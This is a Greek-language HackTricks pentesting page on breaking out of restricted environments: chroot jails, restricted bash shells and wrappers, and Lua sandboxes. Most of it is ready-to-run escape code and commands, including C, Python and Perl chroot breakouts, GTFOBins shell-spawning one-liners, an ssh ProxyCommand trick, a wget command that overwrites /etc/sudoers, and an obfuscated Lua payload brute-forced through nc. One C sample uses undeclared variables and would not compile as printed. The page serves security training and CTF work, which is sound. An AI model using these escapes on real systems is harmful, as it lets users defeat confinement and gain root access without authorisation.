# Διαφυγή από Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Αναζήτησε στο** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείς να εκτελέσεις οποιοδήποτε binary με την ιδιότητα "Shell"**

## Διαφυγές από Chroot

Από τη [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται για προστασία** από σκόπιμη παραβίαση από **προνομιούχους** (**root**) **χρήστες**. Στα περισσότερα συστήματα, τα chroot contexts δεν λειτουργούν σωστά το ένα μέσα στο άλλο και προγράμματα μέσα σε chroot **με επαρκή privileges μπορούν να εκτελέσουν ένα δεύτερο chroot για να διαφύγουν**.\
Συνήθως αυτό σημαίνει ότι για να διαφύγεις πρέπει να είσαι root μέσα στο chroot.

> [!TIP]
> Το **tool** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να εκμεταλλεύεται τα παρακάτω σενάρια και να διαφεύγει από το `chroot`.<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> Αν είσαι **root** μέσα σε ένα chroot, **μπορείς να διαφύγεις** δημιουργώντας **ένα άλλο chroot**. Αυτό συμβαίνει επειδή 2 chroot δεν μπορούν να συνυπάρχουν (στο Linux), οπότε αν δημιουργήσεις έναν φάκελο και στη συνέχεια **δημιουργήσεις ένα νέο chroot** σε αυτόν τον νέο φάκελο, ενώ **εσύ βρίσκεσαι εκτός αυτού**, θα βρίσκεσαι πλέον **εκτός του νέου chroot** και επομένως θα βρίσκεσαι στο FS.
>
> Αυτό συμβαίνει επειδή συνήθως το chroot ΔΕΝ μετακινεί τον τρέχοντα κατάλογό σου σε αυτόν που υποδεικνύεται, επομένως μπορείς να δημιουργήσεις ένα chroot ενώ βρίσκεσαι εκτός αυτού.

Συνήθως δεν θα βρεις το binary `chroot` μέσα σε ένα chroot jail, αλλά **θα μπορούσες να κάνεις compile, να ανεβάσεις και να εκτελέσεις** ένα binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτήν την περίπτωση ο **attacker αποθηκεύει ένα file descriptor στον τρέχοντα κατάλογο** και στη συνέχεια **δημιουργεί το chroot σε έναν νέο φάκελο**. Τέλος, καθώς έχει **access** σε αυτό το **FD** **εκτός** του chroot, αποκτά πρόσβαση σε αυτό και **escapes**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> Το FD μπορεί να μεταβιβαστεί μέσω Unix Domain Sockets, επομένως:
>
> - Δημιουργήστε ένα child process (fork)
> - Δημιουργήστε UDS ώστε το parent και το child να μπορούν να επικοινωνούν
> - Εκτελέστε chroot στο child process σε διαφορετικό φάκελο
> - Στο parent proc, δημιουργήστε ένα FD για έναν φάκελο που βρίσκεται εκτός του νέου chroot του child proc
> - Μεταβιβάστε αυτό το FD στο child procc χρησιμοποιώντας το UDS
> - Το child process εκτελεί chdir σε αυτό το FD και, επειδή βρίσκεται εκτός του chroot του, θα διαφύγει από το jail

### Root + Mount

> [!WARNING]
>
> - Κάντε mount τη root device (/) σε έναν φάκελο μέσα στο chroot
> - Εκτελέστε chroot σε αυτόν τον φάκελο
>
> Αυτό είναι δυνατό στο Linux

### Root + /proc

> [!WARNING]
>
> - Κάντε mount το procfs σε έναν φάκελο μέσα στο chroot (αν δεν υπάρχει ήδη)
> - Αναζητήστε ένα pid που έχει διαφορετική καταχώριση root/cwd, όπως: /proc/1/root
> - Εκτελέστε chroot σε αυτήν την καταχώριση

### Root(?) + Fork

> [!WARNING]
>
> - Δημιουργήστε ένα Fork (child proc), κάντε chroot σε έναν διαφορετικό φάκελο βαθύτερα στο FS και κάντε CD σε αυτόν
> - Από το parent process, μετακινήστε τον φάκελο στον οποίο βρίσκεται το child process σε έναν φάκελο πριν από το chroot των children
> - Αυτό το children process θα βρεθεί εκτός του chroot

### ptrace

> [!WARNING]
>
> - Παλαιότερα οι χρήστες μπορούσαν να κάνουν debug τις δικές τους διεργασίες από ένα process του ίδιου του εαυτού τους... όμως αυτό δεν είναι πλέον δυνατό από προεπιλογή
> - Σε κάθε περίπτωση, αν είναι δυνατό, θα μπορούσατε να κάνετε ptrace σε ένα process και να εκτελέσετε shellcode μέσα σε αυτό ([δείτε αυτό το παράδειγμα](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Λάβετε πληροφορίες σχετικά με το jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Τροποποίηση του PATH

Ελέγξτε αν μπορείτε να τροποποιήσετε τη μεταβλητή περιβάλλοντος PATH<sup>[[2]](#references)</sup>.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρήση του vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers και help viewers

Πολλά περιορισμένα περιβάλλοντα εξακολουθούν να αφήνουν διαθέσιμα τα **pagers** ή τα **help viewers**. Συνήθως είναι πιο γρήγορο να τα εκμεταλλευτείτε παρά να προσπαθήσετε να αναδημιουργήσετε το `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Αν το `git` είναι διαθέσιμο, θυμηθείτε ότι η έξοδος βοήθειάς του συνήθως περνάει από ένα `pager`:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Συνηθισμένα GTFOBins one-liners

Μόλις γνωρίζεις ποια binaries είναι προσβάσιμα, δοκίμασε πρώτα τα προφανή shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Αν μπορείτε να **εισάγετε arguments** μόνο σε μια επιτρεπόμενη εντολή (αντί να την εκτελείτε ελεύθερα), ελέγξτε επίσης το **GTFOArgs**.

### Δημιουργία script

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με περιεχόμενο _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Απόκτηση bash μέσω SSH

Αν έχετε πρόσβαση μέσω ssh, συχνά μπορείτε να ζητήσετε από τον server να εκτελέσει ένα **διαφορετικό πρόγραμμα** αντί για το restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Αν το `ssh` είναι ένα από τα λίγα τοπικά επιτρεπόμενα binaries, θυμηθείτε ότι μπορεί επίσης να γίνει κατάχρηση ως **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείτε να αντικαταστήσετε, για παράδειγμα, το αρχείο sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Ορισμένα περιβάλλοντα δεν σας μεταφέρουν σε ένα απλό `rbash`, αλλά σε **wrappers** όπως τα `git-shell`, `rssh` ή `lshell`:

- Το `git-shell` δέχεται μόνο server-side Git commands, καθώς και οτιδήποτε υπάρχει μέσα στο `~/git-shell-commands/`. Αν υπάρχει αυτός ο κατάλογος, εκτελέστε `help` για να απαριθμήσετε τις επιτρεπόμενες custom actions. Αν μπορείτε να κάνετε **write** εκεί, οποιοδήποτε executable τοποθετηθεί σε αυτόν τον κατάλογο γίνεται προσβάσιμο.<sup>[[3]](#references)</sup>
- Τα `rssh` / `lshell` συνήθως επιτρέπουν μόνο `scp`, `sftp`, `rsync` ή Git-style operations. Σε αυτές τις περιπτώσεις, εστιάστε πρώτα σε **file write primitives**: ανεβάστε το `authorized_keys`, ένα shell startup file ή ένα helper script σε writable location και, στη συνέχεια, επανασυνδεθείτε με `ssh -t ...`.
- Αν το wrapper απλώς φιλτράρει τη command line, απαριθμήστε τα προσβάσιμα binaries και, στη συνέχεια, κάντε pivot ξανά στα **GTFOBins / GTFOArgs**.

### Άλλα tricks

Ελέγξτε επίσης:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Θα μπορούσε επίσης να είναι ενδιαφέρουσα η σελίδα:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks σχετικά με το escaping από Python jails στην παρακάτω σελίδα:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Σε αυτήν τη σελίδα μπορείτε να βρείτε τις global functions στις οποίες έχετε πρόσβαση μέσα στη Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval με command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Μερικά tricks για να **καλέσετε functions μιας library χωρίς να χρησιμοποιείτε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Απαρίθμηση των συναρτήσεων μιας βιβλιοθήκης:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημειώστε ότι κάθε φορά που εκτελείτε το προηγούμενο **one liner** σε ένα **διαφορετικό lua environment**, η σειρά των functions αλλάζει. Επομένως, αν χρειάζεται να εκτελέσετε μία συγκεκριμένη function, μπορείτε να πραγματοποιήσετε μια **brute force attack**, φορτώνοντας διαφορετικά **lua environments** και καλώντας την πρώτη function της βιβλιοθήκης:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Απόκτηση interactive lua shell**: Αν βρίσκεστε μέσα σε ένα περιορισμένο lua shell, μπορείτε να αποκτήσετε ένα νέο lua shell (και, ελπίζουμε, χωρίς περιορισμούς) καλώντας:
```bash
debug.debug()
```
## Αναφορές

- [1] [Chw00t: Πώς να ξεφύγετε από διάφορες λύσεις chroot (Bucsay Balazs, ομιλία και διαφάνειες στο DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Εγχειρίδιο αναφοράς GNU Bash – Το Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Τεκμηρίωση Git](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
